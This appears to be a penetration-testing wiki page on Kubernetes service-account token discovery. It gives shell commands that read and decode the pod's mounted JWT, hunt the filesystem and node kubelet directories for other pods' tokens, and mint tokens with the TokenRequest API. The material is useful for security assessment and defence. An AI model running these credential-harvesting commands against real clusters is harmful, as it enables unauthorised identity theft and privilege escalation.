---
title: "Service account and token discovery: finding and using pod identities"
description: "Every pod runs as a service account whose token is mounted into it. An attacker decodes the mounted token to learn its identity and namespace, hunts for additional tokens in other mounted secrets and on the node, and uses the TokenRequest API where permitted to mint tokens for other service accounts, expanding from one identity to many."
keywords:
  - service account
  - jwt token
  - tokenrequest
  - kubernetes identity
  - token discovery
---

# Service account and token discovery

A Kubernetes service account is the identity a pod authenticates as, and its token is a signed JWT mounted at a known path. Discovery has two parts: understanding the token you already have, and finding others. The mounted token tells you which service account and namespace you are, decoding its claims; additional tokens turn up in other mounted secrets, in environment variables, and, on a node, in every pod's projected token directory.

## Understand the token you hold

```bash
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# decode the JWT payload to read the identity claims
echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# key claims: "kubernetes.io/serviceaccount/service-account.name",
# namespace, and for bound tokens the pod and expiry (exp)
```

## Find other tokens

```bash
# secrets mounted into this pod that are themselves SA tokens
find / -maxdepth 8 -name token -path '*secret*' 2>/dev/null -exec sh -c \
  'echo "== $1 =="; cut -d. -f2 "$1" | base64 -d 2>/dev/null' _ {} \;
# on a node (if escaped): every pod's projected token
ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
# legacy non-expiring token secrets, if readable via the API (next page)
```

## Mint tokens with the TokenRequest API

If the current identity can create token requests for other service accounts, it mints fresh tokens for them:

```bash
kubectl create token <target-sa> -n <ns>                 # needs the right RBAC
# raw API equivalent: POST .../serviceaccounts/<sa>/token
```

This is the enumeration half of [TokenRequest API](../rbac-privilege-escalation/tokenrequest-api.md); whether it works depends on the RBAC the current token carries.

## Exploitation notes

- Decoding the JWT payload (the middle segment, base64url) reveals the exact service account and namespace, which drives every `can-i` check against the API.
- Bound tokens carry an `exp` and are tied to the pod; legacy token-secret tokens do not expire and are more valuable if found, see the token-abuse routes.
- On a node, the projected token of a more privileged pod (for example a system or controller pod) is a direct escalation; node access makes every pod's token readable.

## References

- [Kubernetes: service account token volumes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#serviceaccount-token-volume-projection)
- [Kubernetes: TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
- [HackTricks: Kubernetes tokens](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration)
